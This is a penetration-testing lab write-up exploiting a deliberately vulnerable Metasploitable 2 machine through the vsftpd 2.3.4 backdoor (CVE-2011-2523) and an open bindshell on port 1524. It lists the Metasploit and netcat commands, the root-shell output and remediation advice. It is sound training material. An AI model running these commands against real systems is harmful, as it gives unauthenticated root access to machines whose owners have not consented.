# Lab 04 — Exploitation with Metasploit

**Tool:** Metasploit Framework 6.x, Netcat  
**Target:** Metasploitable 2 (192.168.56.101)  
**Attacker:** Kali Linux (192.168.56.102)  
**CVE:** CVE-2011-2523  
**Full Report:** [metasploit-exploitation-report.docx](./metasploit-exploitation-report.docx)

---

## Objective
Exploit a known backdoor vulnerability (CVE-2011-2523) in vsftpd 2.3.4 using Metasploit to obtain a root shell. Additionally exploit an open bindshell on port 1524 via Netcat.

---

## Vulnerability Details

### CVE-2011-2523 — vsftpd 2.3.4 Backdoor

| Field | Detail |
|---|---|
| CVE | CVE-2011-2523 |
| CVSS Score | 10.0 (Critical) |
| Affected Software | vsftpd 2.3.4 |
| Type | Supply chain backdoor / Remote Code Execution |
| Attack Vector | Network — no authentication required |
| Impact | Unauthenticated root shell |

> The vsftpd 2.3.4 source code was maliciously modified in 2011. Sending a username containing `:)` triggers a root shell on port 6200.

---

## Exploitation — CVE-2011-2523

```bash
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.56.101
run
```

**Result:**
```
[*] Command shell session 1 opened (192.168.56.102 -> 192.168.56.101:6200)
id
uid=0(root) gid=0(root) groups=0(root)
```

---

## Exploitation — Open Bindshell (Port 1524)

```bash
nc 192.168.56.101 1524
```

**Result:**
```
root@metasploitable:/# id
uid=0(root) gid=0(root) groups=0(root)
```

---

## Risk Summary

| Vulnerability | Severity | Impact |
|---|---|---|
| vsftpd 2.3.4 Backdoor | 🔴 Critical (CVSS 10.0) | Unauthenticated root RCE |
| Open Bindshell (1524) | 🔴 Critical | Unauthenticated root shell |

---

## Recommendations
- Remove vsftpd 2.3.4 immediately — replace with patched version or SFTP
- Close port 1524 via firewall
- Implement regular vulnerability scanning (OpenVAS, Nessus)
- Establish a patch management process
- Apply network segmentation to limit exposure

---

## Skills Demonstrated
`Metasploit Framework` `CVE Exploitation` `Netcat` `Post-Exploitation` `Vulnerability Research` `Root Privilege Access`
